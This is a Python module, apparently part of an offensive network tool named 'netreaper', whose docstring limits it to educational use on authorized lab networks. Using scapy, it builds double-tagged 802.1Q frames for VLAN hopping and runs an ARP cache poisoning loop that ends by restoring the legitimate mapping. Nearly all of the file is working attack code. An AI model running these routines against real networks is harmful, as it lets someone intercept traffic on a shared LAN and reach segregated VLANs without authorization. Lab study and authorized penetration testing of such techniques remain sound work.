"""Layer-2 attack proof-of-concepts (VLAN hopping, ARP spoofing).

Requires the optional dependency group and root/CAP_NET_RAW::

    pip install netreaper[l2]

Educational use on authorized lab networks only.
"""
from __future__ import annotations

import time


def _import_scapy():
    try:
        from scapy.all import (  # type: ignore
            ARP,
            Dot1Q,
            Ether,
            IP,
            UDP,
            sendp,
            getmacbyip,
        )
    except ImportError as exc:  # pragma: no cover - dependency guard
        raise RuntimeError(
            "Layer-2 support requires scapy. Install with: pip install netreaper[l2]"
        ) from exc
    return ARP, Dot1Q, Ether, IP, UDP, sendp, getmacbyip


def build_double_tagged_frame(
    interface: str,
    outer_vlan: int,
    inner_vlan: int,
    target_ip: str,
    dst_mac: str = "ff:ff:ff:ff:ff:ff",
) -> bytes:
    """Build an 802.1Q double-tagged frame (DTP/switched-port VLAN hopping PoC).

    The outer tag matches the attacker's access VLAN; the inner tag targets the
    restricted VLAN. Some switch architectures forward the inner-tagged frame
    onto the target VLAN after stripping the outer tag.
    """
    _, Dot1Q, Ether, IP, UDP, _, _ = _import_scapy()
    frame = (
        Ether(dst=dst_mac)
        / Dot1Q(vlan=outer_vlan)
        / Dot1Q(vlan=inner_vlan)
        / IP(dst=target_ip)
        / UDP(dport=80)
        / b"netreaper-vlan-hopping-poc"
    )
    return bytes(frame)


def arp_poison(
    target_ip: str,
    spoof_ip: str,
    interface: str,
    interval: float = 2.0,
    duration: float | None = None,
) -> None:
    """Send gratuitous ARP replies to poison a target's ARP cache.

    Runs until Ctrl-C (or ``duration`` seconds), then restores the cache.
    """
    ARP, _, _, _, _, sendp, getmacbyip = _import_scapy()
    target_mac = getmacbyip(target_ip)
    if not target_mac:
        raise RuntimeError(f"Could not resolve MAC for {target_ip}")

    poison = ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    restore = ARP(op="is-at", pdst=target_ip, hwdst=getmacbyip(spoof_ip), psrc=spoof_ip)

    started = time.time()
    try:
        while True:
            sendp(poison, iface=interface, verbose=False)
            if duration and (time.time() - started) >= duration:
                break
            time.sleep(interval)
    except KeyboardInterrupt:  # pragma: no cover - interactive PoC
        pass
    finally:
        for _ in range(3):  # re-announce the legitimate mapping
            sendp(restore, iface=interface, verbose=False)
            time.sleep(0.5)
